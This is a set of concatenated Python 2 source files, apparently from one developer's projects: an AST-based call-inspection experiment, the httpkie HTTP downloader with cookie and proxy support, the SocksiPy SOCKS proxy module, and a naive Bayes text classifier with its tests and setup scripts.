    raise ValueError("Couldn't identify matching fuction.")


# Možná jen resortovat výstupní OrderedDict na základě pořadí klíčů ve vstupním?
# Nedovolit zanořené cally order()u, tím se eliminuje problém s jeho korektním
# vyhledáním
# 
# Detekce dvou funkcí na jednom řádku


def order(input_dict):
    if not isinstance(input_dict, dict):
        raise ValueError("`input_dict` have to be instance of `dict`.")

    # TODO: this may fuck the 'from import ..' functionality
    frame = inspect.currentframe()

    # get name of current function
    func_name = inspect.getframeinfo(frame).function

    # this helps to reduce lookup complexity
    first_line = frame.f_back.f_code.co_firstlineno

    # get outer frames
    outer_frames = inspect.getouterframes(inspect.currentframe())
    if len(outer_frames) <= 1:
        raise ValueError("Can't inspect outer frame!")

    # select proper outer frame
    frame_info = inspect.getframeinfo(outer_frames[1][0])

    # TODO: remove this data example
    # Traceback(filename='./ast_test.py', lineno=84, function='whops', code_context=['                    "#text": "asd"\n'], index=0)

    # parse the file from which the function call originated
    if not os.path.exists(frame_info.filename):
        raise IOError("Can't open '%s'!" % frame_info.filename)

    with open(frame_info.filename) as f:
        source = f.read()

    tree = ast.parse(source, frame_info.filename)

    # get AST nodes for function call to function with `func_name` name
    func_calls = filter(
        lambda x:
            isinstance(x, ast.Call) and
            hasattr(x.func, "id") and
            x.func.id == func_name,
        ast.walk(tree)
    )

    # filter functions with lineno <= than lineno of frame_info (inspect
    # returns LAST active line of function call, ast returns FIRST line - we
    # need to match those)
    func_calls = filter(
        lambda x: x.lineno <= frame_info.lineno and x.lineno >= first_line,
        func_calls
    )

    if not func_calls:
        raise ValueError("Couldn't find the %s call!" % func_name)

    matching_fn = _match_by_lineno(func_name, frame_info, func_calls)

    print matching_fn.lineno, matching_fn.func.id


def return_xex():
    pass

def whops():
    a = "asd"
    order({"azgabash": a})

    order({
        "r:import": {
            "@xmlns:r": "http://resolver.nkp.cz/v3/",
            "r:monograph": {
                "r:titleInfo": {
                    "r:title": return_xex(
                    ),
                },
                "r:primaryOriginator": {
                    "@type": "AUTHOR",
                    "#text": {"asd":"bsd"}
                },
            },
        }
    })

    order({"asd": "xerexin"})

    return_xex()

whops()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ""
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie

d = httpkie.Downloader(http_proxy = "59.47.43.88:8080")
print d.download("http://www.whatsmyip.us/showipsimple.php")
# print d.download("http://www.fortify.net/cgi/ssl_3.pl")
print d.download("https://www.fortify.net/cgi/ssl_3.pl")#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Easy to use downloader library based on urllib/urllib2
by Bystroushaak (bystrousak@kitakitsune.org)

This work is licensed under a Creative Commons Licence
(http://creativecommons.org/licenses/by/3.0/cz/).
"""
# Imports =====================================================================
import urllib
import urllib2


# Variables ===================================================================
# IE 7/Windows XP headers.
IEHeaders = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
    "Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
    "Accept-Charset": "utf-8",
    "Keep-Alive": "300",
    "Connection": "keep-alive",
}
# Linux ubuntu x86_64 Firefox 23 headers
LFFHeaders = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0",
    "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
    "Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
    "Accept-Charset": "utf-8",
    "Keep-Alive": "300",
    "Connection": "keep-alive",
}


#= Functions & objects ========================================================
class NoRedirectHandler(urllib2.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        infourl = urllib.addinfourl(fp, headers, req.get_full_url())
        infourl.status = code
        infourl.code = code
        return infourl
    http_error_300 = http_error_302
    http_error_301 = http_error_302
    http_error_303 = http_error_302
    http_error_307 = http_error_302


class Downloader():
    """
    Lightweight class utilizing downloads from internet.

    Main method: .download()

    Important properties:
        .headers
        .response_headers
        .cookies
        .handle_cookies
    """

    def __init__(self,
                 headers=None,
                 handle_cookies=True,
                 http_proxy=None,
                 disable_redirect=False):
        """
        You can set:

        headers -- default IEHeaders, but there is also LFFHeaders
        handle_cookies -- set to false if you don't wish to automatically
                          handle cookies
        http_proxy -- 'url:port' describing HTTP proxy
        disable_redirect -- dont follow 300/301/302/307 redirects
        """
        self.headers = headers if headers is not None else IEHeaders
        self.response_headers = None

        self.cookies = {}
        self.handle_cookies = True
        self.disable_redirect = disable_redirect

        self.http_proxy = None
        if http_proxy is not None:
            self.http_proxy = {'http': http_proxy}

    def download(self, url, get=None, post=None, head=None):
        """
        Parameters:
        url -- set url to download, automatically adds htt:// if not present
        get -- dict with GET parameters
        post -- dict with POST parameters
        head -- set to True if you wish to use HEAD request. Returns headers
                from server.
        """
        # POST params
        if post is not None:
            if type(post) not in [dict, str]:
                raise TypeError("Unknown type of post paramters.")
            if type(post) == dict:
                post = urllib.urlencode(post)

        # append GET params to url
        if get is not None:
            if type(get) != dict:
                raise TypeError("Unknown type of get paramters.")
            get = urllib.urlencode(get)
            if "?" in url:
                if url[-1] == "&":
                    url += get
                else:
                    url += "&" + get
            else:
                url += "?" + get

            get = None

        # check if protocol is specified in |url|
        if not "://" in url:
            url = "http://" + url

        if self.handle_cookies:
            self.__setCookies(url)

        # HEAD request support
        url_req = urllib2.Request(url, post, self.headers)
        if head is not None:
            url_req.get_method = lambda: "HEAD"

        # redirect disabling support
        if self.disable_redirect:
            urllib2.install_opener(urllib2.build_opener(NoRedirectHandler))
        else:
            urllib2.install_opener(
                urllib2.build_opener(urllib2.HTTPRedirectHandler)
            )

        # http proxy support
        opener = None
        if self.http_proxy is not None:
            opener = urllib2.build_opener(
                urllib2.ProxyHandler(self.http_proxy)
            )
            urllib2.install_opener(opener)

        # download page and save headers from server
        f = urllib2.urlopen(url_req)
        data = f.read()
        self.response_headers = f.info().items()
        f.close()

        if self.handle_cookies:
            self.__readCookies(url)

        # i suppose I could fix __readCookies() to use dict, but .. meh
        self.response_headers = dict(self.response_headers)

        # head doesn't have content, so return just response headers
        if head is not None:
            return self.response_headers

        return data

    def __setCookies(self, url):
        # add cokies into headers
        domain = self.__getDomain(url)
        if domain in self.cookies.keys():
            cookie_string = ""
            for key in self.cookies[domain].keys():
                cookie_string += key + "=" + str(self.cookies[domain][key]) + "; "

            self.headers["Cookie"] = cookie_string.strip()

    def __readCookies(self, url):
        # simple (and lame) cookie handling
        # parse "set-cookie" string
        cookie_string = ""
        for c in self.response_headers:
            if c[0].lower() == "set-cookie":
                cookie_string = c[1]

        # parse keyword:values
        tmp_cookies = {}
        for c in cookie_string.split(","):
            cookie = c
            if ";" in c:
                cookie = c.split(";")[0]
            cookie = cookie.strip()

            cookie = cookie.split("=")
            keyword = cookie[0]
            value = "=".join(cookie[1:])

            tmp_cookies[keyword] = value

        # append global variable cookies with new cookies
        if len(tmp_cookies) > 0:
            domain = self.__getDomain(url)

            if domain in self.cookies.keys():
                for key in tmp_cookies.keys():
                    self.cookies[domain][key] = tmp_cookies[key]
            else:
                self.cookies[domain] = tmp_cookies

        # check for blank cookies
        if len(self.cookies) > 0:
            for domain in self.cookies.keys():
                for key in self.cookies[domain].keys():
                    if self.cookies[domain][key].strip() == "":
                        del self.cookies[domain][key]

                if len(self.cookies[domain]) == 0:
                    del self.cookies[domain]

    def __getDomain(self, url):
        """
        Parse domain from url.
        """
        if "://" in url:
            url = url.split("://")[1]

        if "/" in url:
            url = url.split("/")[0]

        return url
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from httpkie import *#!/usr/bin/env python
from distutils.core import setup


url = 'https://github.com/Bystroushaak/httpkie'
long_description = """
Documentation can be found in README.creole, or at project pages at github: 
""" + url

setup(
    name         = 'httpkie',
    version      = '1.1.0',
    py_modules   = ['httpkie'],

    author       = 'Bystroushaak',
    author_email = 'bystrousak@kitakitsune.org',

    url          = url,
    description  = 'Easy to use web scrapper with cookies and proxy support.',
    license      = 'CC BY',

    long_description=long_description,

    classifiers=[
        "License :: Public Domain",

        "Programming Language :: Python :: 2.7",

        "Topic :: Software Development :: Libraries",
        "Topic :: Internet :: WWW/HTTP"
    ],
)
"""SocksiPy - Python SOCKS module.
Version 1.00

Copyright 2006 Dan-Haim. All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:
1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.
3. Neither the name of Dan Haim nor the names of his contributors may be used
   to endorse or promote products derived from this software without specific
   prior written permission.
   
THIS SOFTWARE IS PROVIDED BY DAN HAIM "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO
EVENT SHALL DAN HAIM OR HIS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA
OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMANGE.


This module provides a standard socket-like interface for Python
for tunneling connections through SOCKS proxies.

"""

import socket
import struct

PROXY_TYPE_SOCKS4 = 1
PROXY_TYPE_SOCKS5 = 2
PROXY_TYPE_HTTP = 3

_defaultproxy = None
_orgsocket = socket.socket

class ProxyError(Exception):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class GeneralProxyError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks5AuthError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks5Error(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks4Error(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class HTTPError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

_generalerrors = ("success",
		   "invalid data",
		   "not connected",
		   "not available",
		   "bad proxy type",
		   "bad input")

_socks5errors = ("succeeded",
		  "general SOCKS server failure",
		  "connection not allowed by ruleset",
		  "Network unreachable",
		  "Host unreachable",
		  "Connection refused",
		  "TTL expired",
		  "Command not supported",
		  "Address type not supported",
		  "Unknown error")

_socks5autherrors = ("succeeded",
		      "authentication is required",
		      "all offered authentication methods were rejected",
		      "unknown username or invalid password",
		      "unknown error")

_socks4errors = ("request granted",
		  "request rejected or failed",
		  "request rejected because SOCKS server cannot connect to identd on the client",
		  "request rejected because the client program and identd report different user-ids",
		  "unknown error")

def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
	"""setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
	Sets a default proxy which all further socksocket objects will use,
	unless explicitly changed.
	"""
	global _defaultproxy
	_defaultproxy = (proxytype,addr,port,rdns,username,password)
	
class socksocket(socket.socket):
	"""socksocket([family[, type[, proto]]]) -> socket object
	
	Open a SOCKS enabled socket. The parameters are the same as
	those of the standard socket init. In order for SOCKS to work,
	you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
	"""
	
	def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
		_orgsocket.__init__(self,family,type,proto,_sock)
		if _defaultproxy != None:
			self.__proxy = _defaultproxy
		else:
			self.__proxy = (None, None, None, None, None, None)
		self.__proxysockname = None
		self.__proxypeername = None
	
	def __recvall(self, bytes):
		"""__recvall(bytes) -> data
		Receive EXACTLY the number of bytes requested from the socket.
		Blocks until the required number of bytes have been received.
		"""
		data = ""
		while len(data) < bytes:
			data = data + self.recv(bytes-len(data))
		return data
	
	def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
		"""setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
		Sets the proxy to be used.
		proxytype -	The type of the proxy to be used. Three types
				are supported: PROXY_TYPE_SOCKS4 (including socks4a),
				PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
		addr -		The address of the server (IP or DNS).
		port -		The port of the server. Defaults to 1080 for SOCKS
				servers and 8080 for HTTP proxy servers.
		rdns -		Should DNS queries be preformed on the remote side
				(rather than the local side). The default is True.
				Note: This has no effect with SOCKS4 servers.
		username -	Username to authenticate with to the server.
				The default is no authentication.
		password -	Password to authenticate with to the server.
				Only relevant when username is also provided.
		"""
		self.__proxy = (proxytype,addr,port,rdns,username,password)
	
	def __negotiatesocks5(self,destaddr,destport):
		"""__negotiatesocks5(self,destaddr,destport)
		Negotiates a connection through a SOCKS5 server.
		"""
		# First we'll send the authentication packages we support.
		if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
			# The username/password details were supplied to the
			# setproxy method so we support the USERNAME/PASSWORD
			# authentication (in addition to the standard none).
			self.sendall("\x05\x02\x00\x02")
		else:
			# No username/password were entered, therefore we
			# only support connections with no authentication.
			self.sendall("\x05\x01\x00")
		# We'll receive the server's response to determine which
		# method was selected
		chosenauth = self.__recvall(2)
		if chosenauth[0] != "\x05":
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		# Check the chosen authentication method
		if chosenauth[1] == "\x00":
			# No authentication is required
			pass
		elif chosenauth[1] == "\x02":
			# Okay, we need to perform a basic username/password
			# authentication.
			self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
			authstat = self.__recvall(2)
			if authstat[0] != "\x01":
				# Bad response
				self.close()
				raise GeneralProxyError((1,_generalerrors[1]))
			if authstat[1] != "\x00":
				# Authentication failed
				self.close()
				raise Socks5AuthError,((3,_socks5autherrors[3]))
			# Authentication succeeded
		else:
			# Reaching here is always bad
			self.close()
			if chosenauth[1] == "\xFF":
				raise Socks5AuthError((2,_socks5autherrors[2]))
			else:
				raise GeneralProxyError((1,_generalerrors[1]))
		# Now we can request the actual connection
		req = "\x05\x01\x00"
		# If the given destination address is an IP address, we'll
		# use the IPv4 address request even if remote resolving was specified.
		try:
			ipaddr = socket.inet_aton(destaddr)
			req = req + "\x01" + ipaddr
		except socket.error:
			# Well it's not an IP number,  so it's probably a DNS name.
			if self.__proxy[3]==True:
				# Resolve remotely
				ipaddr = None
				req = req + "\x03" + chr(len(destaddr)) + destaddr
			else:
				# Resolve locally
				ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
				req = req + "\x01" + ipaddr
		req = req + struct.pack(">H",destport)
		self.sendall(req)
		# Get the response
		resp = self.__recvall(4)
		if resp[0] != "\x05":
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		elif resp[1] != "\x00":
			# Connection failed
			self.close()
			if ord(resp[1])<=8:
				raise Socks5Error(ord(resp[1]),_generalerrors[ord(resp[1])])
			else:
				raise Socks5Error(9,_generalerrors[9])
		# Get the bound address/port
		elif resp[3] == "\x01":
			boundaddr = self.__recvall(4)
		elif resp[3] == "\x03":
			resp = resp + self.recv(1)
			boundaddr = self.__recvall(resp[4])
		else:
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		boundport = struct.unpack(">H",self.__recvall(2))[0]
		self.__proxysockname = (boundaddr,boundport)
		if ipaddr != None:
			self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
		else:
			self.__proxypeername = (destaddr,destport)
	
	def getproxysockname(self):
		"""getsockname() -> address info
		Returns the bound IP address and port number at the proxy.
		"""
		return self.__proxysockname
	
	def getproxypeername(self):
		"""getproxypeername() -> address info
		Returns the IP and port number of the proxy.
		"""
		return _orgsocket.getpeername(self)
	
	def getpeername(self):
		"""getpeername() -> address info
		Returns the IP address and port number of the destination
		machine (note: getproxypeername returns the proxy)
		"""
		return self.__proxypeername
	
	def __negotiatesocks4(self,destaddr,destport):
		"""__negotiatesocks4(self,destaddr,destport)
		Negotiates a connection through a SOCKS4 server.
		"""
		# Check if the destination address provided is an IP address
		rmtrslv = False
		try:
			ipaddr = socket.inet_aton(destaddr)
		except socket.error:
			# It's a DNS name. Check where it should be resolved.
			if self.__proxy[3]==True:
				ipaddr = "\x00\x00\x00\x01"
				rmtrslv = True
			else:
				ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
		# Construct the request packet
		req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
		# The username parameter is considered userid for SOCKS4
		if self.__proxy[4] != None:
			req = req + self.__proxy[4]
		req = req + "\x00"
		# DNS name if remote resolving is required
		# NOTE: This is actually an extension to the SOCKS4 protocol
		# called SOCKS4A and may not be supported in all cases.
		if rmtrslv==True:
			req = req + destaddr + "\x00"
		self.sendall(req)
		# Get the response from the server
		resp = self.__recvall(8)
		if resp[0] != "\x00":
			# Bad data
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		if resp[1] != "\x5A":
			# Server returned an error
			self.close()
			if ord(resp[1]) in (91,92,93):
				self.close()
				raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
			else:
				raise Socks4Error((94,_socks4errors[4]))
		# Get the bound address/port
		self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
		if rmtrslv != None:
			self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
		else:
			self.__proxypeername = (destaddr,destport)
	
	def __negotiatehttp(self,destaddr,destport):
		"""__negotiatehttp(self,destaddr,destport)
		Negotiates a connection through an HTTP server.
		"""
		# If we need to resolve locally, we do this now
		if self.__proxy[3] == False:
			addr = socket.gethostbyname(destaddr)
		else:
			addr = destaddr
		self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
		# We read the response until we get the string "\r\n\r\n"
		resp = self.recv(1)
		while resp.find("\r\n\r\n")==-1:
			resp = resp + self.recv(1)
		# We just need the first line to check if the connection
		# was successful
		statusline = resp.splitlines()[0].split(" ",2)
		if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		try:
			statuscode = int(statusline[1])
		except ValueError:
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		if statuscode != 200:
			self.close()
			raise HTTPError((statuscode,statusline[2]))
		self.__proxysockname = ("0.0.0.0",0)
		self.__proxypeername = (addr,destport)
	
	def connect(self,destpair):
		"""connect(self,despair)
		Connects to the specified destination through a proxy.
		destpar - A tuple of the IP/DNS address and the port number.
		(identical to socket's connect).
		To select the proxy server use setproxy().
		"""
		# Do a minimal input check first
		if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
			raise GeneralProxyError((5,_generalerrors[5]))
		if self.__proxy[0] == PROXY_TYPE_SOCKS5:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 1080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatesocks5(destpair[0],destpair[1])
		elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 1080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatesocks4(destpair[0],destpair[1])
		elif self.__proxy[0] == PROXY_TYPE_HTTP:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 8080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatehttp(destpair[0],destpair[1])
		elif self.__proxy[0] == None:
			_orgsocket.connect(self,(destpair[0],destpair[1]))
		else:
			raise GeneralProxyError((4,_generalerrors[4]))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
"""
Simple bayess classifier.
"""
#
# Imports =====================================================================
import re
import math
from collections import defaultdict


# Variables ===================================================================
__version__ = "0.1.0"

english_ignore_list = set("""
a able about above abroad according accordingly across actually adj after
afterwards again against ago ahead ain't all allow allows almost alone along
alongside already also although always am amid amidst among amongst an and
another any anybody anyhow anyone anything anyway anyways anywhere apart
appear appreciate appropriate are aren't around as a's aside ask asking
associated at available away awfully b back backward backwards be became
because become becomes becoming been before beforehand begin behind being
believe below beside besides best better between beyond both brief but by c
came can cannot cant can't caption cause causes certain certainly changes
clearly c'mon co co. com come comes concerning consequently consider
considering contain containing contains corresponding could couldn't course
c's currently d dare daren't definitely described despite did didn't different
directly do does doesn't doing done don't down downwards during e each edu eg
eight eighty either else elsewhere end ending enough entirely especially et
etc even ever evermore every everybody everyone everything everywhere ex
exactly example except f fairly far farther few fewer fifth first five
followed following follows for forever former formerly forth forward found
four from further furthermore g get gets getting given gives go goes going
gone got gotten greetings h had hadn't half happens hardly has hasn't have
haven't having he he'd he'll hello help hence her here hereafter hereby herein
here's hereupon hers herself he's hi him himself his hither hopefully how
howbeit however hundred i i'd ie if ignored i'll i'm immediate in inasmuch inc
inc. indeed indicate indicated indicates inner inside insofar instead into
inward is isn't it it'd it'll its it's itself i've j just k keep keeps kept
know known knows l last lately later latter latterly least less lest let let's
like liked likely likewise little look looking looks low lower ltd m made
mainly make makes many may maybe mayn't me mean meantime meanwhile merely
might mightn't mine minus miss more moreover most mostly mr mrs much must
mustn't my myself n name namely nd near nearly necessary need needn't needs
neither never neverf neverless nevertheless new next nine ninety no nobody non
none nonetheless noone no-one nor normally not nothing notwithstanding novel
now nowhere o obviously of off often oh ok okay old on once one ones one's
only onto opposite or other others otherwise ought oughtn't our ours ourselves
out outside over overall own p particular particularly past per perhaps placed
please plus possible presumably probably provided provides q que quite qv r
rather rd re really reasonably recent recently regarding regardless regards
relatively respectively right round s said same saw say saying says second
secondly see seeing seem seemed seeming seems seen self selves sensible sent
serious seriously seven several shall shan't she she'd she'll she's should
shouldn't since six so some somebody someday somehow someone something
sometime sometimes somewhat somewhere soon sorry specified specify specifying
still sub such sup sure t take taken taking tell tends th than thank thanks
thanx that that'll thats that's that've the their theirs them themselves then
thence there thereafter thereby there'd therefore therein there'll there're
theres there's thereupon there've these they they'd they'll they're they've
thing things think third thirty this thorough thoroughly those though three
through throughout thru thus till to together too took toward towards tried
tries truly try trying t's twice two u un under underneath undoing
unfortunately unless unlike unlikely until unto up upon upwards us use used
useful uses using usually v value various versus very via viz vs w want wants
was wasn't way we we'd welcome well we'll went were we're weren't we've what
whatever what'll what's what've when whence whenever where whereafter whereas
whereby wherein where's whereupon wherever whether which whichever while
whilst whither who who'd whoever whole who'll whom whomever who's whose why
will willing wish with within without wonder won't would wouldn't x y yes yet
you you'd you'll your you're yours yourself yourselves you've z zero
successful greatest began including being all for close but
""".split())  #: Default ignore list.


# Functions & classes =========================================================
def tidy(text):
    """
    Convert `text` to unicode. Replace special characters with spaces.

    Args:
        text (str / unicode): Input sentence.

    Returns:
        unicode: Cleaned sentece.
    """
    if not isinstance(text, basestring):
        text = str(text)

    if not isinstance(text, unicode):
        text = text.decode('utf8')

    text = text.lower()

    return re.sub(r'[\_.,<>:;~+|\[\]?`"!@#$%^&*()\s]', ' ', text, re.UNICODE)


def english_tokenizer(text, ignore_list=english_ignore_list):
    """
    Simple english tokenizer used to split input sentence to list of words.

    Words are normalized to lowercase.

    Args:
        text (str/unicode): Input sentence.
        ignore_list (set): Set of words which wouln't be classified. Default
            :attr:`english_ignore_list`.

    Returns:
        list: Strings / words without special characters and separators.
    """
    words = tidy(text).split()

    return [
        word
        for word in words
        if len(word) > 2 and word not in ignore_list
    ]


def occurances(words):
    """
    Count how many times is each word present in input list `words`.

    Args:
        words (list): Tokenized sentence.

    Returns:
        dict: Dictionary ``{"word": int(occurances)}``.
    """
    counts = defaultdict(int)

    for word in words:
        counts[word] += 1

    return counts


class SimpleBayes(object):
    """
    Simple naive bayes classificator, which may be used for spam
    classification.

    Attributes:
        db_backend (obj): Dict-like object used to store values.
        correction (float): Value used as weight for unclassified words.
        tokenizer (ref): Reference to function used for text tokenization.
        sub_dict (ref): Reference to function used for construction of
            sub-dicts.
        _original_keys (set): Set of keys which were in :attr:`db_backend` when
            the constructor was called. This is used to prevent cleaning of
            such keys when the :meth:`reset` is called.
    """
    def __init__(self, db_backend=None, correction=0.1, tokenizer=None,
                 sub_dict=dict):
        """
        Constructor for :class:`SimpleBayes`.

        Args:
            db_backend (dict-like object): Database connector or just plain old
                dict. If ``None``, ``{}`` will be used. Default ``None`.
            correction (float): Value used in classificator in case that the
                word wasn't yet classified. Default ``0.1``.
            tokenizer (func reference): Reference to function used for word
                tokenization. If ``None``, :func:`english_tokenizer` is used.
                Default ``None``.
            sub_dict (func): Function used to construct sub-dictionaries in
                dictionary. Default :func:`dict`.
        """
        self.db_backend = db_backend
        self.correction = correction
        self.tokenizer = tokenizer or english_tokenizer
        self.sub_dict = sub_dict

        if not self.db_backend:
            self.db_backend = {}

        self._original_keys = set(self.db_backend.keys())

    def reset(self):
        """
        Remove trained set from database.
        """
        keys_to_remove = set(self.db_backend.keys()) - self._original_keys

        for cat in keys_to_remove:
            del self.db_backend[cat]

    def train(self, category, text):
        """
        Train bayess classificator to put `text` into `category`.

        Args:
            category (str): Name of the category for `text`.
            text (str): Classified text.
        """
        if category not in self.db_backend:
            self.db_backend[category] = self.sub_dict()

        for word, count in occurances(self.tokenizer(text)).iteritems():
            # defaultdict is not used to allow `self.sub_dict`
            old = self.db_backend[category].get(word, 0)
            self.db_backend[category][word] = old + count

    def untrain(self, category, text):
        """
        Make the classsifier forgot, that `text` belongs to `category`.

        Args:
            category (str): Name of the category into `text` which text was
                classified by mistake.
            text (str): Classified text.
        """
        for word, count in occurances(self.tokenizer(text)).iteritems():
            cur = self.db_backend.get(word)
            if cur:
                new = int(cur) - count
                if new > 0:
                    self.db_backend[category][word] = new
                else:
                    del self.db_backend[category][word]

        if self._tally(category):
            del self.db_backend[category]

    def classify(self, text):
        """
        Let the classificator tell you, where the `text` should belong.

        Args:
            text (str): Sentence for classification.

        Returns:
            str: Name of the category or None in case that classifiers were \
                 not yet trained.
        """
        score = self.score(text)
        if not score:
            return None

        return max(score.iteritems(), key=lambda (k, v): v)[0]

    def score(self, text):
        """
        Get score of category probability for given `text`.

        Args:
            text (str): Sentence for classification.

        Returns:
            dict: ``{"category": int(probability)}``.
        """
        occurs = occurances(self.tokenizer(text))

        scores = {}
        for category in self.db_backend.keys():
            tally = self._tally(category)
            if tally == 0:
                continue

            scores[category] = 0.0
            for word in occurs.keys():
                score = self.db_backend[category].get(word, self.correction)

                scores[category] += math.log(float(score) / tally)

        return scores

    def _tally(self, category):
        """
        Get sum of weights for all words in given `category`.

        Args:
            category (str): Name of the category learnt by :meth:`train`.

        Returns:
            int: Sum of all values in this category.
        """
        tally = sum(self.db_backend[category].values())

        assert tally >= 0, "corrupt bayesian database"

        return tally
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

import simple_bayes
from simple_bayes import english_tokenizer


# Fixtures ====================================================================
@pytest.fixture
def sb():
    return simple_bayes.SimpleBayes()


# Tests =======================================================================
def test_constructor(sb):
    assert sb


def test_filtering(sb):
    sb.reset()

    assert sb.classify('nothing trained yet') is None

    sb.train('good', 'sunshine God love sex lobster sloth')
    sb.train('bad', 'fear death horror government zombie')

    assert sb.classify('sloths are so cute i love them') == 'good'

    assert sb.classify('i am a zombie and love the government') == 'bad'

    assert int(sb.score('i am a zombie and love the government')['bad']) == -7
    assert int(sb.score('i am a zombie and love the government')['good']) == -9

    sb.untrain('good', 'sunshine God love sex lobster sloth')
    sb.untrain('bad', 'fear death horror government zombie')

    assert not sb.score('lolcat')
    assert not sb.score('kočička')


def test_reset(sb):
    sb.train('good', 'sunshine God love sex lobster sloth')
    sb.train('bad', 'fear death horror government zombie')

    assert sb.classify('nothing trained yet')

    sb.reset()

    assert sb.classify('nothing trained yet') is None


def test_reset_keys():
    s = simple_bayes.SimpleBayes(db_backend={"--1": 1})

    s.reset()

    assert "--1" in s.db_backend


def test_tokenizer():
    # Words are lowercased and unicode is supported:

    assert english_tokenizer("Æther")[0] == u"æther"

    # Common english words and 1-2 character words are ignored:

    assert english_tokenizer("greetings mary a b aa bb") == [u'mary']

    # Some characters are removed:

    assert english_tokenizer("contraction's")[0] == "contraction's"
    assert english_tokenizer("what|is|goth")[0] == "goth"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup
from setuptools import find_packages

from docs import getVersion


# Variables ===================================================================
changelog = open('CHANGELOG.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Actual setup definition =====================================================
setup(
    name='',
    version=getVersion(changelog),
    description="Naïve bayesian text classifier for any dict-like backend.",
    long_description=long_description,
    url='https://github.com/Bystroushaak/redisbayes',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Development Status :: 4 - Beta",
        'Intended Audience :: Developers',

        "Programming Language :: Python",
        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 2.7",

